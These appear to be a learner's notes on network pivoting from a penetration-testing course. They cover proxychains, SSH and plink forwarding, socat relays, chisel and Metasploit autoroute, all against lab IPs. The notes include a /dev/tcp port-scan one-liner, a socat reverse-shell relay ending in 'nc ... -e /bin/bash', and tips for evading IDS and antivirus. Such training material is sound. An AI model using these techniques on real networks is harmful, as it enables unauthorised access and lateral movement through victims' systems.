Tunneling/Proxing: Creating a proxy type connection through a compromised machine in order to route all
	the desired traffic into the targeted network. This could potentially also be tunneled inside another protocol (eg SSH tunnelling), which can be useful for evading a basic IDS or firewall.

Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised 	machine. 

Five possible ways to enumerate a network through a compromised host:
	1. Using material found on the machine. The hosts file or ARP cache, for example.
	2. Using pre-installed tools.
	3. Using statically compiled tools
	4. Using scripting techniques
	5. Using local tools  through a proxy

	1. Looking through ARP cache: arp -a
	2. Looking through static mappings:
		1. Linux = /etc/hosts
		2. Windows = C:\Windows\System32\drivers\etc\hosts
		3. Linux = /etc/resolv.conf 
		4. Windows = ipconfig /all
		5. Linux = nmcli dev show

	Using Scripting Techniques:
		1. Bash one liner for ping sweep: 
			>for i in {1..255};  do  (ping -c 1 192.168.1.${i} | grep “bytes from” & ); done	
		2. Port scanning can be done (ideally) entirely natively:
			>for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done


ProxyChains:
	When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.
		Note: Only route traffic through proxy only when required.

	Proxychains is a command line tool which is activated by prepending the command 'proxychains' to other commands. 
		 	Example: proxychains nc 172.16.0.10 23 
		 Note: Proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however; its actually the last location where proxychains will look. The locations (in order are):	
		 	1. The current directory (ie ./proxychains.conf)
		 	2. ~/.proxychains/proxychains.conf
		 	3. /etc/proxychains.conf

	Note: There is another line in the proxychains config that is worth paying attention to, specifically related to the Proxy settings:
		#Proxy DNS requests - no leak for DNS data
		proxy_dns

		If performing an NMAP scan through proxychains, this option can cause the scan to hand and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through a proxy.

	Other things to note when scanning through proxychains:
		-> You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (ping requests) will also not work through the proxy, so use the -Pn switch to prevent Nmap from trying it.
		-> It will extremely slow. Try to only use Nmap through a proxy when using the NSE (ie. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library.)

FoxyProxy: mozilla browser extension


SSH Tunelling/Proxying:
	Forward Connections using SSH
	1. Port Forwarding
		>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
			-L switch creates a link to a local port. 
			-> For example, if we had SSH access to 172.16.0.5 and theres a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10
			-> We could then access the website on 172.16.0.10 by navigating to port 8000 on our own attacking machine. For example, by entering localhost:8000
			-f: background the shell.
			-N: do not execute any commands.
	2. Proxies:
		>ssh -D 1337 user@172.16.0.5 -fN
			-> Proxies are made using the -D switch, for example -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. 


	Reverse Connections using SSH
		Reverse Port Forward:
		-> Reverse Connections are very possible with the SSH client (_and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:
			>ssh-keygen - create a ssh key pair.
			-> Copy the contents of pub key, then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first. 
			-> On a new line, type tje following line, then paste in the pub key. 
				command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
				-> This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
			-> Next, check if the SSH server on your attacking machine is running: sudo systemctl status ssh
			-> Transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over. 
			-> With the key transferred, we can then connect back with a reverse port forward using the following command:
				>ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
			-> To put that into the context of our fictitious IPs 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.5 machine:
				>ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN

		Reverse Proxy:
			In newer versions of SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
				>ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
			-> This again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network. 

	Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in windows systems, even if there is not an SSH server running on the windows system we are connecting from. 		

	Note: To close any of these connections type "ps aux | grep ssh" into the terminal of the machine that created the connection:
		-> Find the process ID of the connection
		-> Finally, type "sudo kill PID" to close the connection.

Plink.exe
	-> It is a windows command line version of the PuTTY SSH client. Now that windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool.
	-> Generally speaking, WIndows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:
		>cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
			-> "cmd.exe /c echo y" at the start is for non-interactive shells.
		Example:
		>cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
			-> To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20)

		Note: The keys generated by ssh-keygen will not properly here. You will need to convert them using the puttygen tool in our attacking machine:
			>puttygen KEYFILE -o OUTPUT_KEY.ppk
			-> Substituting in a valid file for the keyfile, and adding in the output file.

			-> The resulting .ppk file can be transferred to the windows target and used in exactly the same way as with the reverse port forwarding taught previusly (despite the priv key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).


Socat
	-> Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux and Windows. 
	-> Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed the What the Shell? room, you will know that socat can be used to create encrypted connections.
	-> The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.

	-> Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets.
	-> In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
	-> It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

	-> Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we're creating a port forward from a port on the compromised server to a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.

	-> Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

	Reverse Shell Relay:
		In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine.
		>nc -nvlp 443
		-> Next on the compromised server, use the following command to start the relay.
		>./socat tcp-l:8000 tcp:Attacking_IP:443&

		Note: The order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.

		From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated using netcat on the remote server to simulate receiving a reverse shell from the target server:
		>nc 127.0.0.1 8000 -e /bin/bash 

		In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

	Port Forwarding - Easy:
		The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
		./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

		This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10.

		The "fork" option is used to put every connection into a new process, and the "reuseaddr" option means that the port stays open after a connection is made to it. 

		Combined, they allow us to use the same port forward for more than one connection. Once again we use & to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.

		We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

	Port Forwarding - Quiet:
		The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

		First of all, on our own attacking machine, we issue the following command:
		>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

		This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

		Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
		>./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

		This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
		>./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

		This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

		This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:
			-> The request goes to 127.0.0.1:8000
	    	-> Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
	    	-> Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

	    The process is then reversed when the target sends the response:

		    -> The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
    		-> Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

    	We have now achieved the same thing as previously, but without opening any ports on the server!

    Closing of these Socat connections:
    	>jobs
    	>kill %NUMBER

Chisel:
	

Using SSH Tunnels (You must have ssh access to the victim)
	
	1. Local: Forwards a connection from the client host to the SSH server host and then to the destination host port.

		>ssh -L <local_ip>:<local_port>:<dest_service>:<dest_port> username@<ip>
		
		-> If local_ip is omitted, the ssh client binds on the localhost.
		-> When the destination host is the same as the SSH server, instead of specifying the destination host IP or hostname, you can use localhost.


		For example, You want to access a webserver running on the victim's port 10000 and you cant access from outside, then you can set up a local port forward like this:
			>ssh -L 8080:localhost:10000 -N -f username@SSH_server_IP
				-N: dont execute the command
				-f: to run in the background.

	2. Remote: Forwards a port from the server host to the client host and then to the destination host port.
		>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER


Chisel Reverse Port Forwarding
	1. Upload chisel windows binary to the target.
	2. Run chisel server locally:
		./chisel_1.7.3_linux_amd64 server -p 5678 -reverse
		-> This means we have opened up a port 5678 to which chisel client will connect to
	3. Run chisel client on the target:
		chisel.exe client 10.10.16.20:5678 R:8888:127.0.0.1:8888
		-> This means we are connecting to the chisel server running on the attacker machine, and forwarding port 8888 locally so that we can access port 8888 on the attacking machine.
		

Auto-Routing our Traffic:
	To setup a proxy server you will need a meterpreter session or a reverse shell open in metasploit before hand. You can easily get a meterpreter shell by uploading a payload to the machine and executing it.
	1. background
	2. use post/multi/manage/autoroute
	3. set SESSION 1
	4. set SUBNET 10.200.x.0
	5. exploit

Setting up our Proxy with Metasploit:
	1. use auxiliary/server/socks4a
	2. (optional) Change your port, you can either keep the default 1080 port or change it to an open port of your choice.
	
	Note: Depending on what version of Metasploit you are using, the Proxy Server module will be different. MSF5 and lower will have auxiliary/server/socks4a or socks5, MSF6 and newer will have socks/auxiliary/socks_proxy. With MSF6, you will need to specify if you want to use SOCKS4(a) or SOCKS5.
	

Configuring and Using the proxy chains:
	1. sudo nano /etc/proxychains.conf
	2. You will need to comment out the socks4 proxy on 9050 which is a default proxy for tor and add the proxy chain we just created with the port that you gave when creating the proxies.
	3. proxychains <command>
		-> You can now run any normal commands or tools that you want and it will be forwarded through the proxy chain if you append your tool or command with “proxychains”.
		
Pivoting with proxychains:
	Pivoting may seem like a very big and scary thing but it is actually fairly simple after you have your proxy server set up. After setting up the proxy server you can pivot to any machines or resources that the proxy server has access to. For example if you had a proxy server on example-ws01 and example-ws02 was segmented by a security groups that made it so only example-ws01 had access you could use your proxy server on example-ws01 to access example-ws02. You can use any way of accessing the machine that you would usually like ssh, rdp, win-rm, psexec you just have to prepend the command with proxychains.
	
	Examples:
		1.) proxychains ssh user@MACHINE_IP
		2.) proxychains xfreerdp /u:user /p:password /v:MACHINE_IP
		3.) proxychains evil-winrm -i MACHINE_IP -u user -p password

Setting up a Web Proxy with FoxyProxy
	Now that we have a proxy setup to forward our traffic through we need a way to easily access the resources on the network. Let's add an extension to our web browser to allow us to easily route our traffic through it.
	1.) Click on FoxyProxy among your extensions. After that, click on 'Options', Then click on 'Add'.
	2.) Enter in the following setting you will need to fill in the title, proxy type (SOCKS4), Proxy IP, and Port then click 'Save'.
	3.) Click on Foxy Proxy in your extensions and enable the web proxy.
	Note: You can now access internal resources and devices from within firefox.


